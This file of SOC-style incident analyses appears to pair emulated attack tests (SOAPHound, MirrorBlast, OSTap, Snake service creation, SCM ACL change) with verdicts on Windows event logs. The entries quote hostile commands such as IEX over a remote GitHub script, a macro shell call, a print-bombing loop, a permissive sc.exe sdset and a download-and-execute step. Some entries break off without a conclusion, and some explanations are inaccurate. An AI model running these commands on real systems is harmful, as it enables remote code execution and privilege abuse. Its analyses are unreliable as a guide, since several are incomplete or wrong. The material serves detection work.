SOAPHound - Dump BloodHound Data,"### Detailed Analysis

#### PowerShell Logs:

1. **Suspicious PowerShell Activity**:
   - A PowerShell session was initiated with a command that executes a script located in a temporary folder (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\bin\\script.exe`).
   - The script is executed with the following parameters: `--user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2`.
   - Use of plaintext password (`P@ssword1`) and domain details suggest potential credential dumping or unauthorized access attempts.

#### Sysmon Logs:

1. **Process Creation**:
   - Multiple sequential entries show new processes being created, such as `wevtutil.exe`, `conhost.exe`, `WmiPrvSE.exe`, `svchost.exe`, and other typical Windows processes. While these processes themselves are legitimate, their context of execution needs evaluation.

   - **Unusual Use of `wevtutil.exe`**: 
     - The repeated invocation of `wevtutil.exe` could indicate log manipulation activity often associated with malicious attempts to cover tracks or modify the event logs.
   
2. **Executed by Admin User**: 
   - All suspicious activity is performed by an account `SERVER002\\admin_test`. The usage of an administrative user's privileges is consistent with escalations required for compromise activities.

3. **`HOSTNAME.EXE` and `whoami.exe` Execution**:
   - The execution of `HOSTNAME.EXE` and `whoami.exe` might seem benign as they are generally used for system information gathering. However, in a malicious context, these could be used to verify endpoint information in preparation for lateral movement.

#### Assessment of the Situation:
- The presence of plaintext credentials in a PowerShell command, coupled with the script execution from a temporary folder, is highly indicative of malicious intent.
- The PowerShell script's parameters imply attempts to communicate with a domain controller (`--dc 10.0.1.14`) which can denote reconnaissance or an active compromise attempt targeting sensitive network assets.
- The repeated execution of typical processes (`wevtutil.exe`) suggest potential log tampering efforts.

#### Threats and Risks Identified:
- **Credential Harvesting**: Indicative from the parameters used in the PowerShell script.
- **Potential Log Manipulation**: Repeated use of `wevtutil.exe`.
- **Privilege and Access Escalation**: Performed under an admin account indicating possible privilege misuse.

#### Guidance on How to Proceed:
1. **Isolate the System**: Prevent any potential spread or exfiltration.
2. **Password Change and Audit**: Immediate change of credentials involved and conduct a comprehensive audit of any unauthorized access attempts.
3. **Review Other Systems**: Check for similar activities across the network, particularly focusing on domain controllers and other privileged access machines.
4. **Further Investigation**: In-depth analysis of script activities and communications to the domain controller.
5. **Log Restoration**: Ensure the integrity of logs and monitor for further unauthorized log manipulation attempts.

### Resolution: MALICIOUS

Simulate BlackByte Ransomware Print Bombing,"### Analysis of Windows Event Logs

- **Unusual Process Execution & Command-Line Arguments:**
  - A significant volume of `wordpad.exe` instances are being launched in quick succession on the system (`Server002`). This pattern appears abnormal as it could indicate a potential abuse of system resources, possibly pointing towards a Denial-of-Service (DoS) tactic or an attempt to overwhelm system resources. The **Sysmon logs** provide clear evidence of this repetitive and rapid execution, driven by a PowerShell command that triggers multiple instances of `cmd.exe` to invoke `wordpad.exe`.

- **PowerShell Utilization:**
  - The **PowerShell logs** clearly show the execution of a PowerShell command intended to run repetitive tasks. The command `powershell.exe & {cmd /c ""for /l %x in (1,1,75) do start wordpad.exe /p C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data_003note.txt"" | out-null}` indicates an abnormal or unauthorized script execution. This usage of PowerShell could be indicative of script-based attack vectors or misuse.

- **Abnormal System Behavior:**
  - Instances of `MicrosoftEdgeUpdate.exe` and other Microsoft update-related binaries are seen executing, but this could align with legitimate update processes unless identified as anomalous or unwanted lateral movement attempts within the network.

- **Potential Indicators of Malicious Activity:**
  - The **Security logs** show processes executed by an `admin_test` user. This could suggest possible unauthorized usage under an admin-level account, heightening the criticality of monitoring logs for indicators of compromised credentials.

- **Repetitive WordPad Execution Benefit Analysis:**
  - **Impact:** This high-frequency process spawning can suggest resource misuse or may lead to system instability.
  - **Addressing Risks:** There should be immediate control over PowerShell execution policies and restrictions on executing unknown scripts without validation or signed permissions.

### Conclusion:

Mirror Blast Emulation,"**Detailed Analysis:**

1. **Identified Suspicious Behavior:**
   - Repeated execution of the `wevtutil.exe` process by the user `SERVER002\\admin_test`. The `wevtutil.exe` is typically used for managing Windows event logs and is a legitimate tool, but its frequent execution can sometimes be indicative of attempts to clear event logs to hide malicious activity.
   - Following the execution of `HOSTNAME.EXE` and `whoami.exe`, a series of PowerShell commands are executed (`powershell.exe`). The fact that these commands appear in process logs is not inherently malicious but can raise suspicion if the commands are unusual or indicative of reconnaissance (e.g., `whoami.exe` execution).
   - The PowerShell command executed: This command modifies a registry entry related to `Microsoft Office VBA warnings`, which might disable macro warnings in Excel. Furthermore, it runs a file named `mirrorblast_emulation.xlsm` using a shortcut (`Excel 2016.lnk`). This resembles behavior related to macro malware, where an Excel file is used to execute potentially harmful scripts.
   
2. **Indicators of Potential Malicious Activity:**
   - The modification of registry keys affecting VBA macro warnings and execution of `.xlsm` file suggests setting the stage for potential exploitation through malicious macros.
   - The use of PowerShell to modify registry settings and execute an Excel file with a suspicious file path (`mirrorblast_emulation.xlsm`) is indicative of an attempt to exploit Windows environments using malicious macros.
   - The parent process for several events is `wsmprovhost.exe` with `-Embedding`, a legitimate Windows component related to Windows Remote Management. However, it could be leveraged for executing hidden scripts, indicating potential misuse.

3. **Assessment of Situation:**
   - The behavior observed aligns with known techniques used in ""MirrorBlast,"" which is known for leveraging Excel files for payload delivery.
   - The execution context and registry modifications are highly suspicious, pointing towards potential preparatory activities for executing a macro-based attack.

4. **Threats and Risks Identified:**
   - Potential execution of malicious macros leading to further exploitation (e.g., downloading malware, data exfiltration).
   - Attempt to cover tracks by using system tools potentially to manipulate event logs.

5. **Guidance and Recommendations:**
   - **Immediate Mitigation:**
     - Isolate the affected machine to prevent any further potential harmful activities.
     - Revert registry changes related to VBA macro warnings to their original settings to ensure Excel macro warnings are active.
   - **Investigation:**
     - Conduct a thorough forensic investigation to identify all potential threats and collect evidence.
     - Review user actions and any external connections made around the time of the events.
   - **Long-term Protection:**
     - Educate the user about the dangers of executing macros from untrusted files.
     - Implement additional monitoring on PowerShell and script executions.
     - Review and tighten policies on the use of scripting tongues and administrative tools like PowerShell.

**Resolution:** MALICIOUS

Given the execution of system utilities in patterns indicative of common evasion techniques used by attackers and the involvement of suspicious PowerShell activity that implements registry modifications indicative of preparing for an attack, this analysis concludes that the activity is **MALICIOUS**."
Encoded VBS code execution,"Upon reviewing the provided event logs, we can identify several key pieces of information that suggest malicious activity. Here is a detailed analysis:

1. **PowerShell Activity:**
   - There are multiple PowerShell logs indicating the execution of a PowerShell command with the script execution flags. Notably, there is an invocation of an external script directly from GitHub (`""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1""`), which is executed in memory using `IEX` (Invoke-Expression).
   - This type of behavior is suspicious as downloading and executing scripts from the internet directly, especially from platforms like GitHub, without any prior checks or verifications, can be an indicator of malicious activity - typically associated with fileless malware attacks or initial stages of system compromise.

2. **Sysmon Events:**
   - The Sysmon logs show multiple process creations involving `powershell.exe` and its association with potentially dangerous command execution. The logs show activity carried out by a user account `SERVER002\\admin_test`.
   - The PowerShell process is started with high integrity level permissions, suggesting it could modify system-level files or settings if intended.
   - Frequent use of PowerShell alongside specific command-line arguments to run external scripts is often linked with exploitation frameworks or scripts.

3. **Usage of Administrative UAC Techniques:**
   - Scripts identified in the logs seem to leverage administrative privileges. They indicate potential command-and-control (C2) scenarios where scripts attempt to interface with Microsoft Office products -- observed via the `macroFile` parameter, which could be used in attempts to deploy further payloads or macros in documents like Word, commonly utilized in phishing attacks.

4. **Network-based Observations:**
   - The execution of network-based fetch commands via Invoke-WebRequest (`iwr`) further supports the possibility of an external party attempting to introduce commands or fetch additional scripts on the system.

**Assessment and Resolution:**
Given the presence of PowerShell script executions being downloaded from the internet and executed directly, the observed activities indicate a high likelihood of malicious activity. Moreover, the use of administrative privileges to execute such scripts is consistent with common tactics employed by attackers to maintain persistence, execute fileless malware, or deliver additional payloads.

Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host (Server002) from the network to prevent further propagation or data exfiltration.
- Perform a full forensic analysis of the affected system to determine the scope of the compromise and identify any additional payloads or artifacts.
- Check for unusual user account activities, especially for `admin_test`.
- Update firewall and IDS/IPS rules to block any outgoing and incoming traffic that resembles the detected command patterns.
- Educate the users about the risks of executing or downloading scripts from untrusted sources and improve PowerShell logging for better monitoring.
- Consider restoring the affected system from a known good backup if a full recovery from the compromise is not possible.
- Notify the appropriate response teams and follow organizational incident response procedures."
PowerShell Session Creation and Use,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple instances of `powershell.exe` were executed by `SERVER002\admin_test`. The command line executed was:
     ```
     powershell.exe & {New-PSSession -ComputerName $env:COMPUTERNAME, Test-Connection $env:COMPUTERNAME, Set-Content -Path $env:TEMP\data_PowerShell_Session_Creation_and_Use -Value \""data PowerShell Session Creation and Use\"", Get-Content -Path $env:TEMP\data_PowerShell_Session_Creation_and_Use, Remove-Item -Force $env:TEMP\data_PowerShell_Session_Creation_and_Use}
     ```
   - This script creates a PowerShell session, performs a connectivity test, writes and reads a file in the temporary directory, and then deletes it. While these actions can be benign in certain contexts, the combination suggests data transfer or testing actions which could be suspicious if not typically performed by legitimate administrative operations.

2. **Logon and Privilege Assignment:**
   - Multiple anonymous logons were detected using NTLM authentication:
     - EventID 4624 (Logon Success) with types associated with network logons (Type 3) using NTLM.
   - Elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) are consistently assigned to `NT AUTHORITY\SYSTEM` and other high-integrity operations. This could be normal but raises concerns if used in conjunction with non-standard operations.

3. **Creation of Specific Processes:**
   - There were several instances of `wevtutil.exe` and `conhost.exe` created in quick succession by `SERVER002\admin_test`. `wevtutil.exe` is used for managing Windows event logs, and if these events were not part of routine maintenance, it could indicate log tampering or reconnaissance activities.

#### Indicators of Malicious Activity:
 
- **PowerShell Commands:**
  - Using New-PSSession and manipulation of files within PowerShell is a common technique used by attackers for persistence and lateral movement. The script suggests the use of PowerShell for testing network connections and possibly for creating or obfuscating logs.
  
- **Repeated Execution of System Tools:**
  - Repeated and rapid execution of system binaries like `wevtutil.exe` can be a sign of attempts to clear logs or execute administrative tasks stealthily.

#### Assessment and Threats Identified:

Given the context of the entries, the use of PowerShell for potentially abnormal script execution combined with notable system tool accesses and anonymous logons using NTLM could indicate an elevated risk of compromise or unauthorized access, especially since it involves an account with admin privileges on the CEO's machine. These activities, if not part of a known and verified operation, strongly suggest malicious intent.

### Conclusion

**Resolution: SUSPICIOUS**

- **Threats/Risks:**
  - Potential unauthorized access and movement facilitated by PowerShell.
  - Possible log tampering or reconnaissance.
  
- **Guidance on How to Proceed:**
  1. **Investigate the source of the PowerShell scripts and their intended purpose.**
  2. **Verify if the admin_test account use and behavior align with expected administrative tasks and whether the task actions are authorized.**
  3. **Check the network activity related to the machine for signs of data exfiltration or communication with unauthorized endpoints.**
  4. **Inspect and secure logs, potentially involve deeper forensic analysis to determine any log manipulation.**
  5. **Evaluate the need to reset the credentials and access policies associated with the involved accounts.**

It's crucial to escalate this investigation with the IT security team and ensure continuous monitoring of the host and associated network traffic."
OSTap Payload Download,"Upon analyzing the provided Windows event logs, the following key points and potential indicators of malicious activity were identified:

1. **Event ID 4616**: This indicates time changes, which may suggest an attempt to manipulate system time, potentially to masquerade timestamps for malicious activity. However, there are no further indicators to suggest this as malicious in itself.

2. **Event IDs 4624 and 4672**: These logs show system logins and the granting of special privileges. Logon Type 5 indicates a service logon, and the privileges listed include powerful rights like `SeDebugPrivilege` and others that could be leveraged for malicious purposes. However, this can be typical for SYSTEM logons for legitimate system processes.

3. **Sysmon Events**:
   - The execution of `cmd.exe` with a complex command in Event ID 17945 suggests potentially suspicious script execution to download and execute files via a URL (`https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt`). This is highly indicative of potentially malicious activity as it combines script usage with direct URL access and file download, often seen in malicious environments.
   - The use of `schtasks.exe` to delete and create tasks is seen, which could be used for persistence mechanisms but is somewhat routine for system maintenance or legitimate update tasks.

4. **Microsoft Edge Update Activity**: There is extensive activity related to Microsoft Edge Update involving executions of different `exe` files like `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup.exe`, and `MicrosoftEdgeUpdateComRegisterShell64.exe`. While software updates are normal, the sheer volume of these updates and executions in a short timeframe is noteworthy. However, there's no explicit indicator of malicious activities in these events alone.

5. **Event ID 5379**: These events denote credential manager operations with return code `3221226021`, which is `STATUS_NO_SUCH_USER`. These are typically benign and indicate attempts to access a Microsoft account but failing due to incorrect credentials.

**Assessment**:
- There is a high likelihood of malicious activity due to the suspicious use of command-line script involving URL access for downloading files (`cmd.exe` and `cscript`). This represents a potential risk of script-based attacks which might involve downloading and executing malicious content (particularly given the use of JavaScript via `cscript.exe`).

**Resolution**: 
- **MALICIOUS** - The use of scripts to fetch and execute code from an external source (URL) without additional context suggests malicious intent and requires immediate intervention.

**Guidance**:
- It is recommended to isolate the involved system, conduct a thorough malware investigation, and audit accounts and privileges.
- Review firewall logs to see if the domain mentioned in the script (`githubusercontent.com`) has connections that may show this behavior replicated across other systems.
- Verify if any unexpected processes or applications were executed in tandem with this script execution.
- Implement additional monitoring and detection for similar script execution patterns across the network."
ATHPowerShellCommandLineParameter -Command parameter variations,"In analyzing the provided Windows event logs, several observations stand out:

1. **Frequent Use of `powershell.exe`:** The frequent execution of PowerShell commands on the system can be associated with both administrative tasks and potential malicious activity. Specifically, the command `powershell.exe & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop}` is unusual. The command's usage, especially with parameters like `-Execute` and `-ErrorAction Stop`, could be indicative of a script executing without interruptions, which may be used by malware or during intrusion attempts.

2. **Use of `wevtutil.exe`:** The presence of `wevtutil.exe` in multiple logs raises suspicion. It is often used in environments for legitimate purposes, such as managing event logs, but it is also known to be exploited by attackers to clear or tamper with logs, which is a common tactic for hiding traces of nefarious activity.

3. **Execution of `whoami.exe` and `hostname.exe`:** These commands are typically used by administrators to gather information about the system's logged-in user and hostname, respectively. While not inherently malicious, their execution following suspicious PowerShell activities might be indicative of an attacker gathering system information post-compromise.

4. **High Integrity Level:** The logs indicate processes running at a high integrity level under the `SERVER002\admin_test` account, suggesting that these activities have administrative privileges. If this activity is unexpected for this account, it could signal unauthorized access or user account compromise.

5. **System-Level Processes:** The logs show processes such as `CompatTelRunner.exe`, `svchost.exe`, and `services.exe`, executing in the NT Authority context, which are typical Windows processes. Their presence and execution here are not deemed suspicious without further specific content indicating otherwise.

6. **Absence of Direct Evidence of Threats:** The system logs and Windows update logs do not reveal any obvious signs of malicious activity. They primarily focus on standard updates and system operations, adding weight to the analysis of the Sysmon logs.

Based on this analysis, while there are no definitive indicators of currently ongoing malicious activity, the frequent execution of PowerShell with particular commands, combined with administrative-level access and somewhat anomalous usage, suggests potential concern.

**Assessment and Resolution:**

- **Resolution:** **SUSPICIOUS**
  
  The observed activities, particularly regarding PowerShell use and potential evasion attempts using `wevtutil.exe`, are suspicious and warrant a closer investigation to determine the nature and intent of these activities. Monitoring and possibly restricting administrative account operations and PowerShell usage, alongside reviewing and analyzing related system and network logs, would help in drawing a more accurate conclusion.

**Guidance:**
- **Conduct a forensic analysis:** Examine the scripts and command line inputs related to PowerShell thoroughly. Look into logs around this timestamp for abnormal network activity or data exfiltration attempts.
- **Audit the user account:** Investigate the `admin_test` account's recent activities and status, ensuring no unauthorized access.
- **Implement monitoring and alerting:** Enable alerting for unusual script usage, especially from PowerShell, evaluating the execution policies on systems to prevent bypassing security mechanisms.
- **Review and update security controls:** Consider enhancing existing security controls, such as application whitelisting and script block logging, to better capture and offer more insights into unusual behaviors on the system."
AutoIt Script Execution,"After analyzing the provided logs, here is a detailed assessment:

### Suspicious or Anomalous Behavior:

1. **Use of PowerShell with AutoIt**: 
   - The PowerShell event logs reveal the execution of a script using AutoIt (`C:\Program Files (x86)\AutoIt3\AutoIt3.exe`). AutoIt is often used to automate tasks within Windows but can also be leveraged for malicious purposes.
   - Observations indicate that this execution was performed by `admin_test` user, a non-standard administrative user account.
   - The PowerShell command line specifies a suspicious file path within a temporary folder, which is atypical for legitimate AutoIt scripts: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\calc.au3`.

2. **Use of System Utilities**:
   - Execution of standard utilities (`hostname.exe`, `whoami.exe`) by the `admin_test` user shortly following the AutoIt script launch indicates possible enumeration activity.
   - Tools like `wevtutil.exe` were also seen in execution, which can be used to clear event logs as part of anti-forensics measures. However, without definitive evidence of log clearing, its use remains suspicious but not definitively malicious.

3. **Multiple Credential Access Requests (Event ID 5379)**:
   - Several attempts to access credentials (even though failed with a return code 3221226021) were logged, which point towards potential credential harvesting attempts.

### Indicators of Malicious Activity or Compromise:

- **Parent-Child Process Relationships**:
  - The reflection of processes and their lineage with the `wsmprovhost.exe` parent process might employ Windows Remote Management (WinRM) for lateral movement or remote command execution.
  - AutoIt script execution through PowerShell and the creation of a succession of command shells (`conhost.exe`) aligns with behavioral patterns seen in PowerShell-based attacks aiming to maintain stealth.

- **High Integrity Level**:
  - Processes executed as High Integrity suggest they have elevated privileges, increasing the potential severity of any malicious activity conducted.

### Assessment of the Situation:

- The use of AutoIt through PowerShell, coupled with the listed behaviors (like enumeration and credential access attempts), suggests a level of intent that is beyond normal administrative tasks.
- While direct evidence of data exfiltration or specific malicious payload execution is absent, the overall pattern indicates potential preparation for a malicious operation.

### Conclusion: SUSPICIOUS

**Resolution**: The logs contain suspicious activities that warrant further investigation. While overtly malicious actions haven't been conclusively identified, the activities observed should trigger heightened scrutiny around the `admin_test` user and associated processes. Additional logs showing network traffic, file modifications, or suspicious scheduled tasks may provide more concrete evidence. It is advised to:
- Perform a comprehensive review of user access and account usage policies.
- Monitor network traffic for unusual outbound connections.
- Conduct a forensic analysis of files and scripts involved in the AutoIt execution.
- Consider isolating the affected machine to prevent potential spread.

This situation underscores the need for proactive threat hunting activities in the environment to validate the potential presence of an advanced persistent threat actor."
Snake Malware Service Create,"Upon review of the provided logs, several observations can be made:

### Observations from Logs:

1. **Execution of System Utilities**:
   - Multiple events show execution of common Windows utilities like `whoami.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, and `sc.exe` by the user `SERVER002\admin_test`.
   - These utilities are legitimate system tools, often used in both administrative tasks and during the enumeration phase in attacks, particularly by attackers to gather information about the system and perform various actions such as managing services.

2. **Creation of Suspicious Service**:
   - A new service named `WerFaultSvc` was created using `sc.exe`. The command line for the creation was:
     ```
     ""cmd.exe"" /c sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto
     ```
   - This is odd because `WerFault.exe` is typically a Windows Error Reporting tool and not something that should normally be involved in creating or managing Windows services.

3. **System Integrity Level**:
   - The processes were run with a High integrity level, indicating that the user executing these commands had significant privileges, likely administrative.

4. **Event Log Exports**:
   - The utility `wevtutil.exe` was used to export event logs:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx
     ```
   - While this can be an administrative action, in combination with the other observed activities, it could suggest attempts to access and/or exfiltrate logs.

### Analysis:

- The execution of the `sc.exe` command to create a service with the Application Error Reporting executable (`WerFault.exe`) is particularly suspicious. This is a known technique used by adversaries to run custom payloads under the guise of legitimate services to maintain persistence or execute malicious actions.
- Although the use of utilities like `whoami`, `wevtutil`, and `cmd` can be benign or administrative, their presence along with service creation with a non-standard command strongly indicates potentially unauthorized or malicious action, especially on a high-profile user machine like the CEO's.

### Assessment and Recommendation:

- **Assessment**: There are strong indicators of potentially malicious activity, particularly the creation of the `WerFaultSvc` service with questionable command-line arguments, which deviates from typical use.
- **Recommendation**: Conduct immediate further investigation into the creation of `WerFaultSvc`, scrutinizing:
  - The origin of the commands (confirming the identity of `admin_test` user)
  - Any network activities or data access preceding and succeeding these events.
  - If found malicious, remove the service, audit all systems for similar unauthorized changes, and enhance monitoring.

### Resolution: 
- **MALICIOUS**: Given the evidence, the logs show indicators of potential compromise that cannot be attributed to benign activity without further clarification. Immediate action is recommended to prevent potential malicious outcomes."
Extract Memory via VBA,"Upon thorough analysis of the provided Windows event logs, several events stand out as potentially indicative of malicious activity:

1. **Suspicious PowerShell Activity:**
   - A `powershell.exe` process was executed with a command line that retrieves and executes a script from a URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`). This type of activity is often associated with attempts to run unauthorized scripts or download malicious content from the internet.
   - Relevant logs: Event IDs 18019, 18020 in the Sysmon log, and multiple PowerShell logs indicating the start and stop of the script execution.

2. **Unusual Network Services Manipulation:**
   - There are events involving the `wevtutil.exe` and `conhost.exe` processes under a user context (`SERVER002\\admin_test`), which wrapped around the PowerShell activities. Evtutil is a command-line utility for managing event logs, and its usage following suspicious PowerShell could indicate attempts to cover traces or tamper with logs.
   - Relevant logs: Event IDs 17992, 17993 in the Sysmon log.

3. **Elevated Privileges Event:**
   - The security logs contain Event ID 4672, which indicates that special privileges were assigned to a process. This is common after malicious actors escalate privileges.
   - While elevated privileges can be legitimate for `NT AUTHORITY\\SYSTEM`, combined with other suspicious activity, it becomes noteworthy.

4. **Frequent Edge Update Executions:**
   - Several instances of `MicrosoftEdgeUpdate.exe` with different command-line arguments and integrity levels were noted, which might indicate legitimate updates, but due to concurrent suspicious activity, warrant a closer look.
   - Relevant logs: Multiple Sysmon entries indicating Edge Update executions, particularly with command lines such as `/svc`, `/c`, and `/ua /installsource core`.

Overall, the presence of a PowerShell script fetched from an external URL, combined with the manipulation of event logs and elevation of privileges, suggests potential malicious activity. The specific usage of PowerShell to execute scripts from the internet is a known red flag for threats like fileless malware attacks.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- **Immediate Containment:** Disconnect the affected system from the network to prevent any further communication with potential command and control servers.
- **Forensic Analysis:** Conduct a detailed forensic investigation to determine the full scope and impact of the incident, particularly focusing on the downloaded script and any changes or actions taken by the scripts.

- **Continuous Monitoring:** Enhance monitoring for similar PowerShell execution patterns and network activities across similar systems within the organization.
- **Security Awareness:** Ensure awareness among users about the risks of executing scripts from unverified origins and reinforce training on safe computing practices."
Maldoc choice flags command execution,"### Detailed Analysis

Upon analyzing the provided logs, several indicators suggest potentially malicious activity, specifically centered around the use of PowerShell:

#### PowerShell Logs
- **Suspicious Command Execution**: There are multiple entries in the PowerShell logs that show the execution of a PowerShell command that retrieves and executes a remote script from GitHub. The command sequence:
  ```powershell
  powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing)
  $macrocode = ""a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
  Invoke-script -macroCode $macrocode -officeProduct ""Word""}
  ```
  This line attempts to invoke a script via a macro code with interaction through Microsoft Word, which is a known tactic used in malware distribution to bypass defenses by manipulating legitimate applications.

#### Sysmon Logs
- **Process Creation**: Sysmon logs record the execution of PowerShell and other associated processes (e.g., `conhost.exe`) under the user `SERVER002\admin_test`. The parent process `wsmprovhost.exe` suggests remote management sessions might be involved.
- **Network-Related Activity**: The script utilizes `iwr` (Invoke-WebRequest) to reach out to an external URL, which is typically associated with dropping a payload or exfiltration.
  
#### Other Observations
- **Integrity Level**: Processes run at a High integrity level, meaning they have high privileges on the system, increasing the risk of significant damage or data exfiltration.
- **Abnormal HostApplication Values**: The `HostApplication` involved suggests manipulation to run potentially malicious scripts in memory without writing to disk.
  
### Assessment
Based on the above findings, the activities observed are:
- Indicators of a common script-based attack utilizing PowerShell to download and execute potentially malicious code.
- Possible misuse of legitimate Windows functionalities (like PowerShell and wsmprovhost.exe) to execute unauthorized actions covertly.

### Threats and Risks Identified
- **Potential Compromise**: The PowerShell script from GitHub suggests a possible remote code execution attack vector targeting the machine.
- **High Privilege Execution**: Processes running with high privileges indicate a higher risk of gaining unauthorized access to sensitive data or system configurations.

### Guidance
1. **Immediate Investigation**: Conduct a deeper investigation on the specific GitHub repository and the script located at the provided URL to determine its nature and origin.
2. **Endpoint Isolation**: Isolate the affected machine (Server002) to prevent further potential spread within the network.
3. **Review Logs and Systems**: Thoroughly review other logs and systems the account `admin_test` had accessed during the potential intrusion timeframe.
4. **Temporarily Block Network Connections**: Consider blocking outgoing connections to potentially suspicious domains.
5. **Update and Patch**: Ensure PowerShell and all system components are up to date with the latest security patches.

### Recommended Resolution
**MALICIOUS** - The analyzed logs contain activity including PowerShell commands executed to retrieve and execute potentially harmful scripts from an external source, consistent with tactics used in compromise attempts. This warrants immediate containment and further incident response actions."
OSTAP JS version,"## Detailed Analysis

### Suspicious or Anomalous Behavior

1. **PowerShell Execution:**
   - The Sysmon and PowerShell logs show the execution of PowerShell with a script retrieved from an external URL (`iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1""`). This is indicative of a suspicious behavior pattern known as fileless malware, often used by threats like Emotet or TrickBot.
   - The command line includes disabling PowerShell’s security protocols and executing scripts directly from an external source, raising significant red flags.

2. **Process Execution:**
   - Execution of `wevtutil.exe` and `conhost.exe` in quick succession with the user `SERVER002\admin_test` could point to attempts at tampering with event logs or an unusual use of console host processes.
   - The `whoami.exe` process execution appears to be querying user identity, particularly when followed immediately by further PowerShell activity.

3. **JScript Execution:**
   - The PowerShell event logs detail a script that writes and executes a JScript file `C:\Users\Public\art.jse`. This behavior is closely associated with malware attempting to execute commands via wscript.

4. **Edge Update Processes:**
   - There are multiple EdgeUpdate processes seen running with system integrity, which may be benign if they're scheduled updates. However, the presence of updates in `Temp` directories or unique session IDs (`/ping PD94bWwgdmVyc...`) should be validated to ensure they match known update behaviors.

5. **High Integrity Levels:**
   - Processes running with high integrity levels typically require administrator privileges, highlighting potential privilege escalation or misuse of permissions by `admin_test`.

### Indicators of Malicious Activity

- **Malicious PowerShell Commands:** The PowerShell logs indicate command execution that bypasses typical security controls and behavior consistent with payload delivery/buffering.
- **Potential Tactics, Techniques, and Procedures (TTPs):**
  - T1059.001: PowerShell used for executing scripts
  - T1059.005: Visual Basic/Scripts executed through cmd.exe
  - T1105: Remote file copy/download command execution 

### Threat Assessment
There is clear evidence pointing towards suspicious activities that align with several known malicious techniques, particularly involving PowerShell and remote script execution.

### Risk and Threats
- **Data Leakage/Ransomware:** The external fetching and execution of scripts could potentially lead to data exfiltration or ransomware deployment.
- **Privilege Escalation:** The use of high-integrity processes not typically required for general usage scenarios suggests possible privilege escalation.

Excel 4 Macro,"Upon analyzing the Windows event logs provided, there are several indicators of potentially malicious activity observed within the entries:

1. **Suspicious PowerShell Activity**: 
    - Multiple instances of `powershell.exe` are observed running with a heavily obfuscated and encoded command line. Specifically, this PowerShell script is utilizing Excel macros to manipulate external applications and download files from an external source (live.sysinternals.com/procexp.exe).
    - The script clears files named ""file_redteam_x4m_exec.vbs"" and ""procexp.exe"" if they exist, downloads the ""procexp.exe"" from Sysinternals, and executes it, possibly making this a part of a post-exploitation framework or malware attempting to elevate privileges or execute unauthorized actions on the system.

2. **Usage of `wevtutil.exe`**: 
    - Multiple executions of `wevtutil.exe` are observed. This tool is commonly used for clearing event logs, which could be an indication that an attacker is trying to cover their tracks after executing malicious activities.

3. **Conhost.exe Patterns**: 
    - Several instances of `conhost.exe` are associated with suspicious processes, potentially as a cover for command-line operations or related to the above PowerShell activities.
    
4. **High Integrity Level Execution**: 
    - The PowerShell script is executed with a high integrity level, indicating it is running with elevated privileges, which might be leveraged to compromise the system further.

**Assessment**: 
These logs showcase a well-known attack pattern using PowerShell scripts to download and execute external executables, likely part of a living-off-the-land strategy or initial compromise phase. The absence of security logs could be due to log clearing activities noted by the usage of `wevtutil.exe`. The attempts to download from live.sysinternals.com might exploit tools often used by attackers during post-exploitation activities.

**Resolution**: 
- **MALICIOUS**: The activities within the logs are aligned with known attack vectors and seem to indicate the presence of potential malicious activity, especially given the nature of the PowerShell script and its actions observed in the logs.

**Guidance**:
1. **Immediate Actions**:
    - Isolate the affected host to prevent further access and lateral movement.
    - Perform comprehensive endpoint scans for persistence mechanisms or other indicators of compromise (IoCs).
    - Analyze firewall and network logs for any unusual outbound connections or communications.

2. **Remediation and Investigation**:
    - Remove any suspicious or potentially harmful scripts and executables identified.
    - Review user activities, especially for accounts like ""admin_test"", for unauthorized or unusual actions.
    - Conduct a full system audit, including a potential reimage if necessary, to ensure the system is clean.

3. **Preventive Measures**:
    - Implement application whitelisting to restrict unauthorized applications from running.
    - Enforce PowerShell script block logging and transcription to monitor advanced script execution.
    - Educate and train users about the risks of phishing and running unexpected files.

Further investigation is required to understand fully the scope and depth of the potential compromise."
Modifying ACL of Service Control Manager via SDET,"After examining the provided Windows event logs, I have identified several actions and events that merit further scrutiny. Below is a detailed analysis of the activities logged, assessing whether they exhibit signs of suspicious or malicious behavior:

1. **Service Control Manager Configuration Tool (sc.exe) Execution:**
   - In the logs, there was a command execution of ""cmd.exe /c sc.exe sdset scmanager D:(A;;KA;;;WD)"". This command is manipulating service permissions, which is an unusual action on a CEO's machine. The specific command modifies security descriptors for service control manager, allowing any authenticated user to have key access rights (KA) to the service manager. This could potentially be used to start or stop services or to alter configurations.
   - This is a strong indicator of a potential privilege escalation or disruption attempt. 

2. **Frequent Process Execution:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` running under the context of the user `SERVER002\admin_test`. `wevtutil` is used for managing event logs and could indicate log tampering or querying, especially when occurring in rapid succession. This, together with the admin context, can be a sign of suspicious activity, possibly related to covering tracks.

